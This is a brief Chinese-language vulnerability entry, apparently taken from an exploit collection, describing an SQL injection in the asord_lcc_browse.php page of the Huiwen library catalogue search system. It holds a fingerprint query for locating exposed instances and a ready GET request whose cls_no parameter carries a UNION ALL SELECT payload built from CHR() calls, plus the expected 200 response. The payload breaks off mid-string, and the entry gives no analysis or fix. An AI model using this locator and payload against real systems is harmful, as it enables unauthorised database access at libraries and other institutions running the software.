# 汇文软件-书目检索系统asord_lcc_browse.php存在SQL注入漏洞

- **系统**：汇文软件-书目检索系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="汇文软件-书目检索系统"`
- **请求**：`GET /asord/asord_lcc_browse.php?cls_no=A%'+UNION+ALL+SELECT+CHR(113)CHR(107)CHR(107)CHR(112)CHR(113)CHR(87)CHR(71)CHR(77)CHR(70)CHR(73)CHR(118)CHR(75)CHR(68)CHR(86)CHR(110)CHR(85)CHR(106)CHR(102)CHR(117)CHR(66)CHR(106)CHR(102)CHR(118)CHR(104)CHR(122)CHR(86)CHR(77)CHR(68)CHR(117)CHR(73)CHR(105)CHR(84`
- **关键头**：`Priority: u=0, i`
- **预期**：200　|　—